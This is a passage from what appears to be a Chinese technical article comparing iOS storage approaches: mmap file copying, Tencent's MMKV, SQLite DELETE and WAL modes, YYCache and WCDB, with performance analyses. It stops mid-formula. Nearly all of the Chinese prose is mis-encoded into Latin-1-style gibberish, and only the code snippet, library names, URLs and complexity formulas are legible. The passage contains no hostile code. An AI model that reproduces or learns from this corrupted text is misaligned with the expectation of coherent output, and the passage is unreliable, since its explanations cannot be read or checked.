çš„å‡½æ•°ï¼Œå…¶åº•å±‚é€‚ç”¨ swap å®ç°ã€‚å®ƒå°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„ä¸€å—è™šæ‹Ÿåœ°å€ç©ºé—´ä¸Šï¼Œæ“ä½œæ–‡ä»¶ç®€åŒ–ä¸ºç›´æ¥æ“ä½œå†…å­˜ã€‚  ç¤ºä¾‹ç¨‹åºï¼šä¸‹é¢æ˜¯ä¸€ä¸ªæ‹·è´æ–‡ä»¶çš„ç¤ºä¾‹ç¨‹åºï¼š\nauto mmap_src = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd_src, 0); auto mmap_dst = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd_dst, 0); if (mmap_src == MAP_FAILED || mmap_dst == MAP_FAILED) {  return ; } memcpy(mmap_dst, mmap_src, size); å› ä¸ºè¿™ç§æ–¹æ¡ˆä½¿ç”¨äº†è™šæ‹Ÿå†…å­˜ç³»ç»Ÿçš„ swap æœºåˆ¶ï¼Œmmap æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š\n å¹¶ä¸å ç”¨è¿›ç¨‹å†…å­˜ï¼šä»–æ˜¯ç›´æ¥æ˜ å°„åˆ°æ“ä½œç³»ç»Ÿå¯¹ IO è®¾å¤‡çš„ç¼“å­˜ PageCache ä¸Šã€‚ç›¸å¯¹äºæ­£å¸¸IOæ“ä½œï¼Œä»–ç›´æ¥å°±çœå»äº†PageCache å¤åˆ¶æ•°æ®åˆ°è¿›ç¨‹ä¸­çš„ Buffer è¿™ä¸€æ­¥éª¤ï¼Œçœå»äº†ä¸€å¤§ç¬”å†…å­˜å¤åˆ¶çš„å¼€é”€ã€‚ æ•°æ®å…±äº«ï¼šå¤šä¸ªè¿›ç¨‹å¦‚æœæ˜ å°„åˆ°åŒä¸€æ–‡ä»¶ï¼Œå› ä¸ºä»–ä»¬ä¼šæ˜ å°„åˆ°ç›¸åŒçš„ç‰©ç†å†…å­˜ä¸Šã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­å°±æ˜¯åŠ¨æ€åº“åŠ è½½ï¼ŒåŠ¨æ€åº“å°±æ˜¯é€šè¿‡ mmap æ¥å®ç°å…±äº«çš„ã€‚ å›å†™ç‰¹æ€§ï¼šæ‰‹åŠ¨ msync è§¦å‘ï¼›åœ¨ munmapã€è¿›ç¨‹è¢«æ€æ­»ã€å†…å­˜ç´§å¼ æ—¶è‡ªåŠ¨è§¦å‘ï¼›éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šå®šæœŸå›å†™ã€‚åªè¦æ•°æ®å†™å…¥äº†å†…å­˜ï¼Œå³ä½¿å†™å…¥è¿›ç¨‹è¢«æ€æ­»ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šè´Ÿè´£æ•°æ®çš„å›å†™ã€‚  æ³¨æ„è¿™ä¸ªæŠ€æœ¯çš„ç¬¬ä¸‰ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸å…³å¿ƒå›å†™ç£ç›˜çš„é—®é¢˜ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨å®Œæˆã€‚\nMMKV æŠ€æœ¯ #  ä»€ä¹ˆæ˜¯ MMKVï¼ˆå¼€æºåœ°å€ï¼šhttps://github.com/Tencent/MMKVï¼‰ï¼Ÿ\n  MMKV æ˜¯è…¾è®¯å¼€æºçš„ä¸€ä¸ª k-v å­˜å‚¨åº“ï¼Œæ—¨åœ¨æ›¿ä»£ NSUserDefaultï¼›\n  Plist çš„å†™å…¥ç“¶é¢ˆåœ¨äºæ–‡ä»¶ä¸­æ²¡æœ‰æ•°æ®ç»“æ„ï¼Œä¸èƒ½ç›´æ¥è¿›è¡ŒæŸ¥è¯¢å’Œæ•°æ®æ’å…¥æ“ä½œï¼Œå¯¼è‡´æ¯æ¬¡å¿…é¡»å…¨é‡å†™å…¥åºåˆ—åŒ–åçš„æ•°æ®ï¼›\n  MMKV æŠ€æœ¯ä½¿ç”¨ mmap åœ¨å†…å­˜ä¸­æ˜ å°„äº†ä¸€ä¸ªç®€å•çš„æ•°æ®ç»“æ„ï¼›è¿™ä¸ªæ•°æ®ç»“æ„å¤§æ¦‚æ˜¯ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š\n   META_INFO KEY_SIZE KEY_VALUE DATA_SIZE DATA_VALUE     ä¸€äº›åŸºæœ¬ä¿¡æ¯æ¯”å¦‚æ£€æµ‹æ•°æ®å®Œæ•´æ€§çš„ CRC é”®å¤§å° é”® å€¼å¤§å° å€¼      MMKV æŠ€æœ¯çš„å·¥ä½œæµç¨‹ï¼š\n è¯»æ•°æ®ï¼šMMKV åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šé€šè¿‡ mmap è¯»å–æ‰€æœ‰çš„æ•°æ®ï¼Œç„¶ååœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ª Dictionaryã€‚ å†™æ•°æ®ï¼šå½“æœ‰ä¸€ä¸ªæ–° pair æ—¶ï¼Œé¦–å…ˆå†™å…¥ç¼“å­˜ï¼Œç„¶ååœ¨ mmap æ–‡ä»¶å°¾éƒ¨è¿½åŠ ä¸€ä¸ª pairã€‚ æ³¨æ„:warning:ï¼šMMKV æ–‡ä»¶ä¸­å¯¹äºä¸€ä¸ª Key å¯èƒ½æœ‰å¤šä¸ª Pair å­˜åœ¨ã€‚å³ä½¿ä¸€ç›´æ“ä½œåŒä¸€ä¸ªPairï¼Œä¹Ÿä¼šå¯¼è‡´MMKVæ–‡ä»¶çš„å¢å¤§ã€‚å½“ MMKV å†™å…¥çš„æ•°æ®å°†è¦è¶…è¿‡ç›¸å…³æ–‡ä»¶çš„å¤§å°æ—¶ï¼ŒMMKV ä¼šè¿›è¡Œ mumap æ“ä½œï¼Œå¹¶æ‰©å¤§æ–‡ä»¶é•¿åº¦ï¼Œé‡æ–°è¿›è¡Œ mmap æ“ä½œï¼ŒåŒæ—¶ç”¨å†…å­˜ç¼“å­˜ä¸­çš„æ•°æ®å…¨é‡å†™å…¥ï¼Œè¦†å†™åŸæ¥çš„ MMKV æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ­¤æ—¶å®Œæˆ key-value ä¸€å¯¹å¤šçš„æ•°æ®å»é‡ï¼Œè§£å†³äº† MMKV æ–‡ä»¶å ç”¨è¿‡å¤§çš„é—®é¢˜ã€‚  æ€§èƒ½åˆ†æï¼š\n è¯»æ€§èƒ½ï¼šæ­£å¸¸æ—¶ç›´æ¥è¯»å–å†…å­˜ï¼Œæ‰€ä»¥å¹³å‡è¯»æ€§èƒ½æ—¶é—´å¤æ‚åº¦ä¸º 0ï¼›åˆå§‹åŒ–æ—¶éœ€è¦å…¨é‡è¯»å–åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä¸” MMKV ä¸è¦†ç›–çš„ç‰¹æ€§æ¯ä¸ªé”®æœ‰å¤šä¸ªå€¼å¯¹åº”ã€‚è®¾æ¯ä¸ªé”®æœ‰ k ä¸ªå­˜å‚¨è®°å½•ï¼Œæ—¶é—´å¤æ‚åº¦ k*O(n)ï¼› å†™æ€§èƒ½ï¼šé€šå¸¸çš„æ“ä½œä»ç„¶åœ¨å†…å­˜ä¸­è¿›è¡Œï¼Œå¤æ‚åº¦ 0ï¼›æœ€åæƒ…å†µæ˜¯è§¦å‘äº† swapï¼Œå…¨é‡å†™å› O(n)ï¼› ç©ºé—´æ€§èƒ½ï¼šå› ä¸ºå†—ä½™è®°å½•çš„å­˜åœ¨ï¼Œç©ºé—´å¤æ‚åº¦ k*O(n)ï¼›å†…å­˜ç©ºé—´å¤æ‚åº¦ O(n)ã€‚ å¹¶å‘æ€§èƒ½ï¼šçº¿ç¨‹å®‰å…¨ï¼Œä½†æ˜¯ä¸æ”¯æŒå¹¶å‘ï¼›  MMKV å½»åº•è§£å†³äº† NSUserDefault å†™å…¥æ€§èƒ½æ…¢çš„é—®é¢˜ï¼Œå†™å…¥æ€§èƒ½å‡ ä¹è¾¾åˆ°å†…å­˜çº§åˆ«ï¼Œä½†æ˜¯å¶å°”è¿˜æ˜¯ä¼šæœ‰å…¨é‡å›å†™çš„æƒ…å†µå‘ç”Ÿã€‚å¦å¤– MMKV åœ¨æ­£å¸¸æƒ…å†µä¸‹å¤§å¤§é™ä½äº†æ•°æ®ä¸¢å¤±çš„é£é™©ï¼ˆapp è¢«çªç„¶æ€æ­»ï¼‰ï¼Œä½†æ˜¯å¯¹äºçªç„¶æ–­ç”µçš„æƒ…å†µï¼Œå¯èƒ½ä¼šæœ‰æ¯”è¾ƒå¤§çš„é£é™©ã€‚\nSQLite #  ä¸ºäº†å®ç°ä¸ä¾èµ–ç¼“å­˜çš„é«˜æ•ˆè¯»/å†™ï¼Œæˆ‘ä»¬éœ€è¦æ›´é«˜çº§çš„æ•°æ®ç»“æ„ï¼ŒåŸºäº B-Tree çš„ SQLiteï¼Œæ˜¯ç§»åŠ¨ç«¯ç›®å‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„é€‰æ‹©ï¼Œé™¤äº†æä¾›é«˜æ•ˆè¯»å†™æ€§èƒ½å¤–ï¼ŒSQL çš„å¼ºå¤§æŸ¥è¯¢èƒ½åŠ›ä¹Ÿä¸ºæˆ‘ä»¬å®ç°é«˜æ•ˆ ORM ç³»ç»Ÿæä¾›äº†åŸºç¡€ã€‚\nDELETE æ¨¡å¼ #  SQLite æä¾›äº†æ ‡å‡†çš„äº‹åŠ¡å›æ»šæœºåˆ¶ã€‚ä¸ºäº†å®ç°äº‹åŠ¡å›æ»šï¼ŒSQLite æä¾›äº†æ—¥å¿—çš„æ¦‚å¿µï¼Œå³åœ¨å†™å…¥æ•°æ®åˆ° B-Treeå‰è®°å½•ä¸€ä»½æ—¥å¿—åˆ°ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœäº‹åŠ¡å†™å…¥å¤±è´¥ï¼Œåˆ™é€šè¿‡æ—¥å¿—æ¢å¤è€çš„æ•°æ®ã€‚\nSQLite çš„é»˜è®¤æ—¥å¿—æ¨¡å¼ä¸º DELETE æ¨¡å¼ï¼Œå³åœ¨å†™å…¥å®Œæˆååˆ é™¤æ—¥å¿—æ–‡ä»¶ã€‚\næ€§èƒ½åˆ†æï¼š\n  è¯»æ€§èƒ½ï¼ˆå¹³å‡ä¸æœ€åç›¸åŒï¼‰ï¼šå‡è®¾ B-Tree å•ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ x ä¸ªå­©å­ï¼Œåˆ™æŸ¥è¯¢å¤æ‚åº¦ä¸º $$O(log_{x} n)$$ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®çš„èŠ‚ç‚¹æ•°ç›®ä¸ä¼šè¶…è¿‡ 4 ä¸ªã€‚\n  å†™æ€§èƒ½ï¼ˆå¹³å‡ä¸æœ€åç›¸åŒï¼‰ï¼šæŸ¥è¯¢è€æ•°æ® $$O(log_x n)$$ï¼Œå†™å…¥æ—¥å¿— O(1)ï¼Œå†™å…¥ B-Tree $$O(log_x n)$$ã€‚ æ‰€ä»¥æ€»å…±çš„ IO å¤æ‚åº¦ä¸º $$O(2 * log_x n)$$ã€‚\n  ç©ºé—´æ€§èƒ½ï¼šSQLite çš„ç©ºé—´æ€§èƒ½è¾ƒå·®ï¼Œä¸»è¦æ˜¯å› ä¸ºï¼š\n B-Tree çš„æ•°æ®ç»“æ„éœ€è¦ç»´æŠ¤è®¸å¤šé¢å¤–çš„ç´¢å¼•ï¼Œä¼šå¸¦æ¥æå¤§çš„ç©ºé—´å¼€é”€ï¼› åˆ é™¤è¯­å¥æ‰§è¡Œä¹‹åï¼Œé»˜è®¤ä¸ä¼šåˆ é™¤ç›¸å…³çš„ä¿¡æ¯ï¼Œè€Œæ˜¯å°†èŠ‚ç‚¹æ ‡è®°ä¸ºå¯é‡ç”¨ã€‚    å¹¶å‘æ€§èƒ½ï¼šSQLite é»˜è®¤æä¾›å¤šç§çº¿ç¨‹æ¨¡å¼ï¼Œå¯ä»¥è®¾ç½®ä¸ºç”± SQLite æä¾›çº¿ç¨‹å®‰å…¨çš„ä¿è¯ï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸ºæœ‰ç”¨æˆ·è‡ªè¡Œä¿è¯ã€‚åœ¨ä¿è¯æ¯ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªè¿æ¥çš„æƒ…å†µä¸‹ï¼ŒSQLite ä¹Ÿæ”¯æŒè¯»å¹¶å‘ï¼Œä½†ä¸æ”¯æŒè¯»å†™å¹¶å‘å’Œå†™å†™å¹¶å‘ã€‚\nSQLite å› ä¸ºæ˜¯å¤©ç”Ÿå¤šè¿›ç¨‹æ”¯æŒï¼Œé”çº§åˆ«æ˜¯æ–‡ä»¶é”ï¼Œæ–‡ä»¶é”çš„æœ€å¤§é—®é¢˜æ˜¯ä¸èƒ½åƒæ™®é€šé”ä¸€æ ·æœ‰è‡ªåŠ¨å”¤é†’æœºåˆ¶ï¼Œåœ¨è·å–é”å¤±è´¥å SQLite ä¼šè¿‡ä¸€æ®µæ—¶é—´å°è¯•å†æ¬¡è·å–é”ï¼ˆç±»ä¼¼äºè‡ªæ—‹ï¼‰ï¼Œå¦‚æœè¶…å‡ºä¸€å®šçš„æ¬¡æ•°å°±ä¼šæŠ›å‡º SQLite-Busy é”™è¯¯ã€‚\n  DELETE æ¨¡å¼ä¸‹çš„ SQLiteï¼Œåœ¨è¯»æ€§èƒ½ä¸Šæœ‰æ¯”è¾ƒå¥½çš„è¡¨ç°ï¼Œå¹³å‡å’Œæœ€åæ€§èƒ½éƒ½éå¸¸ç¨³å®šã€‚ä½†æ˜¯å†™å…¥æ€§èƒ½è¿œè¿œæ…¢äºè¯»æ€§èƒ½ï¼Œä¸ºäº†å®‰å…¨ï¼Œé¢‘ç¹çš„fsync è°ƒç”¨ä¹Ÿä¼šå¤§å¤§æ‹–æ…¢å†™å…¥æ€§èƒ½ã€‚ä½†æ˜¯ç”±äºå…¶æ˜¯å¢é‡æ“ä½œæ¨¡å¼ï¼Œæ¯æ¬¡æ“ä½œçš„æ•°æ®ä¸ä¼šå¾ˆå¤§ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå†™å…¥æ€§èƒ½ä¹Ÿè¶³å¤Ÿä½¿ç”¨ï¼Œè‡³å°‘è¿œè¿œé«˜äºä¼ ç»Ÿçš„æ–‡ä»¶å†™å…¥æ–¹å¼ã€‚\nWAL æ¨¡å¼ #  WAL æ˜¯ SQLite æ–°å¼•è¿›çš„ä¸€ç§æ—¥å¿—æŠ€æœ¯ï¼Œå…¶æ—¨åœ¨æå‡ SQLite çš„å†™å…¥æ€§èƒ½ï¼Œä»¥åŠå¹¶å‘æ€§ã€‚\nå·¥ä½œæµç¨‹ï¼š\n WAL æ¨¡å¼ä¸‹ SQLite ç›´æ¥å°†æ–°å†™å…¥çš„æ•°æ®è½¬åŒ–ä¸ºä¸€ä¸ªæ—¥å¿—ï¼Œè¿½åŠ åœ¨ WAL æ–‡ä»¶çš„å°¾éƒ¨ï¼ˆç”±äºæ˜¯è¿½åŠ ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é¡ºåºå†™ï¼Œå†™å…¥æ€§èƒ½å‡ åå€äºéšæœºå†™ï¼‰ è¿½åŠ å®Œä»¥åï¼Œå†™å…¥æ“ä½œå®Œæˆã€‚ å½“å†™å…¥çš„æ•°æ®é‡åˆ°è¾¾ä¸€å®šé˜ˆå€¼ï¼ˆé»˜è®¤ä¸º 4Mï¼‰çš„æ—¶å€™ï¼Œé€šè¿‡ä¸€ä¸ªå«åš checkpoint çš„è¿‡ç¨‹ï¼Œå°† WAL ä¸­è®°å½•çš„æ—¥å¿—å…¨éƒ¨ç»Ÿä¸€å†™å› B-Treeï¼Œç„¶ååˆ é™¤ WAL æ–‡ä»¶ã€‚  å…³äº checkpoint ä¸»è¦ä¼šé¢ä¸´çš„éš¾é¢˜ï¼š\n å†™å…¥å³°å€¼ï¼ˆåœ¨å†™å…¥æ“ä½œè§¦å‘äº† checkpoint æ“ä½œæ—¶åè¿™æ¬¡å†™å…¥ä¼šéå¸¸æ…¢ï¼‰ã€WAL æ–‡ä»¶å¤§å°æ§åˆ¶ï¼›  æ€§èƒ½åˆ†æï¼š\n  å¹³å‡è¯»æ€§èƒ½ï¼šè¯»æ•°æ®æ—¶å…ˆä¼šä» WAL æ–‡ä»¶æŸ¥æ‰¾æ•°æ®ï¼Œæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå«åš shm çš„ç´¢å¼•æ–‡ä»¶æä¾›åŠ é€Ÿï¼ŒWAL å¤§å°æ§åˆ¶åœ¨ 10M ä»¥å†…ï¼ŒæŸ¥æ‰¾æ•ˆç‡æ¥è¿‘äº B-Treeï¼›å¦‚æœ WAL æ–‡ä»¶æ‰¾ä¸åˆ°åˆ™ä¼šè¿›å…¥ B-Tree ä¸­æŸ¥æ‰¾ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¤ä¸º IO å¤æ‚åº¦ä¸º $$O(log_x n)$$\næœ€åè¯»æ€§èƒ½ï¼šå¦‚æœ WAL æ–‡ä»¶è¿‡å¤§ï¼Œåˆ™è¯»æ€§èƒ½é€€åŒ–ä¸ºçº¿æ€§ï¼Œm ä¸ªæ—¥å¿—è®°å½•çš„ IO å¤æ‚åº¦ä¸º $$O(m)$$\n  å¹³å‡å†™æ€§èƒ½ï¼šå†™å…¥åªéœ€è¦è¿½åŠ æ—¥å¿—åˆ° WAL æ–‡ä»¶çš„å°¾éƒ¨å°±å®Œæˆäº†å†™å…¥ã€‚åˆå› ä¸º WAL æ–‡ä»¶çš„ç»“æ„å¹¶ä¸åƒ B-Tree é‚£æ ·å¤æ‚ï¼Œå¯ä»¥ä¸éœ€è¦æ¯æ¬¡å†™å…¥ WAL éƒ½è¿›è¡Œ fsyncï¼Œå†™å…¥å¼€é”€ä¸º O(1)\næœ€åå†™æ€§èƒ½ï¼šå½“ SQLite éœ€è¦è¿›è¡Œ Checkpoint æ—¶ï¼Œé¦–å…ˆéœ€è¦ä» WAL ä¸­è¯»å–æ•°æ®ï¼Œå…¶æ¬¡æ’å…¥B-Treeï¼Œå‡è®¾WAL æ–‡ä»¶æœ‰ m ä¸ªæ—¥å¿—ï¼Œåˆ™å†™å…¥å¼€é”€ä¸º $$m * O( log_x n ) + O(m)$$\n  æ•°æ®å®Œæ•´æ€§ï¼šWAL æ–‡ä»¶æŸåè¾ƒå®¹æ˜“æ¢å¤ï¼Œå®Œæ•´æ€§ä¼˜äº DELETE æ¨¡å¼ï¼›\n  ç©ºé—´æ€§èƒ½ï¼šWAL æ–‡ä»¶è¿˜æ˜¯è¿è¡Œçš„ä¸´æ—¶æ–‡ä»¶ï¼Œç©ºé—´æ€§èƒ½ä¸ DELETE æ¨¡å¼ç›¸ä¼¼ï¼›\n  å¹¶å‘æ€§èƒ½ï¼šWAL æ¨¡å¼æä¾›äº†è¯»å†™å¹¶å‘çš„èƒ½åŠ›ï¼Œå½“ä¸€ä¸ªè¯»è€…è¿›å…¥ WAL æ–‡ä»¶æ—¶ï¼Œä¼šæ‰¾åˆ°æœ€åä¸€ä¸ªæ²¡æœ‰è¢«å†™å…¥çš„èŠ‚ç‚¹å¹¶è¿›è¡Œ markï¼Œå¦‚ log6ï¼Œç„¶ååœ¨è¿™ä¸ª log ä¹‹å‰çš„æ•°æ®ä¸­è¿›è¡ŒæŸ¥æ‰¾ç›¸å…³ key æ¯”è¾ƒè€çš„å‰¯æœ¬ï¼Œè€Œæ•°æ®å†™å…¥ä¾ç„¶å¯ä»¥å¹¶å‘çš„ Append åˆ° WAL æ–‡ä»¶çš„å°¾éƒ¨ã€‚ç”±äº SQLite-Busy çš„é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œå¦‚æœæ— æ³•å¤„ç†Busyï¼Œä¾ç„¶å¯ä»¥è®¤ä¸ºSQLiteåœ¨WALæ¨¡å¼ä¸‹ä¹Ÿæ²¡æœ‰å¹¶å‘èƒ½åŠ›ã€‚\n  YYCache #  YYCache æ˜¯ä¸€ä¸ªåŸºäº SQLite çš„æŒä¹…åŒ–ç¼“å­˜æ¡†æ¶ï¼Œå…¶ä½œä¸º YYWebImage çš„é…å¥—å›¾ç‰‡ç¼“å­˜å¹¿ä¸ºäººçŸ¥ã€‚\nå®ƒæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n YYCache çš„æ¥å£æ˜¯ K-V å½¢å¼çš„ï¼Œå¹¶æä¾›äº†æ·˜æ±°ç­–ç•¥ã€‚ YYCache çš„æŒä¹…åŒ–å±‚ç”± SQLite ä¸æ–‡ä»¶ç³»ç»Ÿæ··åˆç»„æˆã€‚ YYCache çš„ SQLite ä¸­æœ‰ä¸€å¼  manifest è¡¨æ¥å­˜å‚¨æ•°æ®å’Œæ·˜æ±°ç­–ç•¥ç›¸å…³çš„ä¿¡æ¯ã€‚  YYCache ä¸€äº›æœºåˆ¶åˆ†æï¼š\n å°æ–‡ä»¶ä¼˜åŒ–ï¼šå¯¹äº 20KB ä»¥ä¸‹çš„æ–‡ä»¶ç›´æ¥å­˜å…¥ SQLiteï¼ŒèŠ‚çœç£ç›˜ç©ºé—´ã€‚å› ä¸ºä½¿ç”¨ mmap æ“ä½œæ–‡ä»¶ç³»ç»Ÿï¼Œæ¯ä¸ªå•ç‹¬æ–‡ä»¶çš„å¤§å°ä¸€å®šæ˜¯é¡µè¡¨å¤§å°çš„æ•´æ•°å€ï¼ˆ4K æˆ– 8Kï¼‰ï¼› æ·˜æ±°æœºåˆ¶ï¼šä¸ºäº†ç»´æŠ¤ LRU (Least Recently Used) ç›¸å…³æ•°æ®ï¼ŒYYCache æ¯æ¬¡è¯»å†™å…¥ä¸€ä¸ªæ•°æ®è¿˜éœ€è¦é¢å¤–è®°å½• last_access_time å’Œ modification_time æ•°æ®ï¼ŒåŒæ—¶åœ¨æ•´ä½“å¤§å°è¶…è¿‡é˜ˆå€¼çš„æ—¶å€™ï¼ŒQuery å…¨è¡¨æ‰¾åˆ°æœ€è€çš„æ•°æ®å¹¶æ‰¹é‡åˆ é™¤ã€‚è¿™ä¸ºæ•´ä¸ªç³»ç»Ÿå¸¦æ¥äº†é¢å¤–çš„å¼€é”€ã€‚ checkpoint ç­–ç•¥ï¼šYYCache ä½¿ç”¨ SQLite çš„ WAL æ¨¡å¼ï¼Œå¹¶é‡‡ç”¨äº†é»˜è®¤çš„Checkpoint ç­–ç•¥ã€‚ æ³¨æ„:warning:ï¼šYYCache çš„åŸç”Ÿå®ç°åœ¨è¿›è¡Œè¯»å–æ“ä½œåå¹¶æ²¡æœ‰è¿›è¡Œ resetï¼ˆåªåœ¨æ¯æ¬¡è¯»æ“ä½œå¼€å§‹å‰ resetï¼‰ï¼Œè¿™å¯èƒ½å¯¼è‡´è¯»è¡Œä¸ºä¸€ç›´ä¸ç»“æŸï¼Œè¿›è€Œå¯¼è‡´ Checkpoint æ— æ³•å›æ”¶æ­£åœ¨è¢«è¯»å–çš„æ•°æ®ï¼Œæç«¯æƒ…å†µä¸‹ä¼šå¯¼è‡´ WAL è†¨èƒ€åˆ° GB çº§åˆ«ï¼Œæœ€ç»ˆå¯¼è‡´ WAL çš„ Checkpoint æ°¸è¿œæ— æ³•å®Œæˆï¼Œæ•°æ®åº“è¯»å†™æ“ä½œå…¨éƒ¨ç›´æ¥å¡æ­»ã€‚  æ€§èƒ½åˆ†æï¼š\n  å¹³å‡è¯»æ€§èƒ½ï¼šé€šå¸¸æƒ…å†µä¸‹ï¼Œè¯»æ•°æ®æ—¶ï¼Œä¸ºäº†ç»´æŠ¤ LRU ä¿¡æ¯ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡ last_access_time å†™æ“ä½œï¼Œæ‰€ä»¥å…¶ IO æ€§èƒ½ä¸º $$O(log_x n) + O(1)$$ã€‚å¦‚æœå‘½ä¸­äº†ç¼“å­˜ï¼Œåˆ™åªæœ‰å†™ IO æ“ä½œï¼Œå³ O(1)ã€‚\næœ€åè¯»æ€§èƒ½ï¼šå°±æ˜¯è§¦å‘ checkpoint æ—¶ï¼ŒWAL æ–‡ä»¶æœ‰ m ä¸ªæ—¥å¿—ï¼Œåˆ™ IO æ€§èƒ½ä¸º $$m * O( log_x n ) + O(m) + O(log_x n)$$\n  å¹³å‡å†™æ€§èƒ½ï¼ŒåŒ WAL æ¨¡å¼çš„ SQLiteï¼ŒO(1)\n  æœ€åå†™æ€§èƒ½ï¼Œå¦‚æœè§¦å‘äº† LRU é˜ˆå€¼ï¼Œä¼šè¿›è¡Œå…¨è¡¨æ‰«æä»¥åŠ deleteï¼Œå†åŠ ä¸Š checkpointï¼ŒIO å¤æ‚åº¦ä¸º $$O(n) + m * O( log_x n ) + O(m)$$\n  æ•°æ®å®Œæ•´æ€§èƒ½ï¼ŒåŒ WAL æ¨¡å¼çš„ SQLiteã€‚\n  ç©ºé—´æ€§èƒ½ï¼Œç”±äºæœ‰é¢å¤–å­—æ®µè®°å½• LRU ä¿¡æ¯ï¼Œä¼šå¤§äºå­˜å‚¨æ•°æ®çš„æœ¬èº«ï¼Œå¦å¤– YYCache æœ‰å†…å­˜ç¼“å­˜ï¼Œå¤§å°æ˜¯å¸¸æ•° kï¼Œå¤æ‚åº¦ä¸º O(k)ã€‚\n  å¹¶å‘æ€§èƒ½ï¼ŒYYCache é‡‡ç”¨äº†äº’æ–¥æ¨¡å¼ï¼Œçº¿ç¨‹å®‰å…¨ï¼Œä½†ä¸èƒ½å¹¶å‘ã€‚\n  YYCache ä½œä¸ºä¸€ä¸ªç¼“å­˜æ¡†æ¶æœ¬èº«æ˜¯å¾ˆä¼˜ç§€çš„ï¼Œç‰¹åˆ«åœ¨å­˜å‚¨å›¾ç‰‡æ—¶ï¼Œè¿˜ä¼šæ ¹æ®æ–‡ä»¶å¤§å°é€‰æ‹©æœ€åˆé€‚çš„æ–¹æ¡ˆè¿›è¡Œå­˜å‚¨ï¼Œå‡å°äº†ç£ç›˜å ç”¨å’Œç¢ç‰‡æ–‡ä»¶ï¼Œæå‡äº†å†™å…¥æ•ˆç‡ã€‚ä½†æ˜¯ LRU æœ¬èº«çš„å¼€é”€è¿˜æ˜¯éå¸¸å¤§ï¼ŒåŸºäºå…¨ç›˜æ‰«æçš„æ·˜æ±°ä»¥åŠé»˜è®¤çš„ checkpoint ç­–ç•¥å¯èƒ½ä¼šå¯¼è‡´æ¯”è¾ƒä¸¥é‡çš„å¡é¡¿ï¼Œè‡ªèº«çš„ Bug è¿˜å¯èƒ½å¯¼è‡´ç”¨æˆ·æ— é™ ANRï¼Œç©ºé—´å ç”¨ä¹Ÿæ¯”è¾ƒå¤§ã€‚è™½ç„¶ YYCache çš„æ¥å£æ˜¯ K-V çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å»ºè®®ï¼Œå½“éœ€è¦æœ‰æ·˜æ±°æœºåˆ¶çš„æ—¶å€™æ‰é€‰æ‹© YYCacheï¼Œå¦‚æœåªæ˜¯éœ€è¦ä¸€ä¸ª K-V åº“è¯·é€‰ç”¨å…¶ä»–æ–¹æ¡ˆæˆ–è€…è‡ªå·±å®ç°ã€‚\nWCDB #  WCDB æ˜¯è…¾è®¯å¼€æºçš„ä¸€ä¸ª SQLite å°è£…ï¼Œå…¶æä¾›äº†é«˜é€Ÿ ORM ç³»ç»Ÿï¼Œä»¥åŠé’ˆå¯¹ SQLite è¿›è¡Œäº†ä¸å°‘ä¼˜åŒ–ã€‚\nä¸‹é¢åˆ—ä¸¾è¿™ä¸ªå°è£…åšçš„å‡ ä»¶äº‹æƒ…ï¼š\n ä¼˜åŒ–å¹¶å‘èƒ½åŠ›ï¼šåœ¨WCDB ä¸ºäº†è§£å†³ SQLite-Busy çš„é—®é¢˜ï¼Œç›´æ¥ä¿®æ”¹æºç å»é™¤äº† SQLite çš„æ–‡ä»¶é”ï¼Œä½¿ç”¨æ­£å¸¸çš„å”¤é†’æœºåˆ¶æ›¿æ¢ã€‚è¿™ä½¿å¾— SQLite çš„å¹¶å‘èƒ½åŠ›å¾—åˆ°å……åˆ†çš„é‡Šæ”¾ã€‚ checkpoint ç­–ç•¥ï¼šSQLite é»˜è®¤ç­–ç•¥æ‰§è¡Œçš„ä¸¤ä¸ªç¼ºç‚¹æ˜¯ï¼Œå†™å…¥å³°å€¼ä¸ WAL æ–‡ä»¶æ— é™å¢é•¿ï¼š  å¯¹äºå‰è€…ï¼ŒWCDB ä½¿ç”¨å¼‚æ­¥ checkpoint çš„æ–¹å¼ï¼šå®šä¹‰ sqlite3_wal_hook å‡½æ•°ç”¨äºæ‰§è¡Œ checkpointï¼ŒWAL æ–‡ä»¶å¤§å°è¶…è¿‡é˜ˆå€¼åï¼Œå¼€å¯æ–°çš„çº¿ç¨‹ç­‰å¾… 2s æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œä»è€Œä¸ä¼šé˜»å¡å†™å…¥ï¼› å¯¹äºåè€…ï¼Œä¸ºäº†é˜²æ­¢ WAL æ–‡ä»¶æ— é™å¢é•¿ï¼Œå½“æ–‡ä»¶å¤§å°è¶…è¿‡é˜ˆå€¼åï¼ŒWCDB ä¼šé”æ­» DBï¼Œé˜»å¡æ–°çš„è¯»å†™æ“ä½œï¼Œç›´åˆ° checkpoint å®Œæˆã€‚    æ€§èƒ½åˆ†æï¼š\n  å¹³å‡ä¸æœ€åå†™æ€§èƒ½å‡ä¸º $$O(log_x 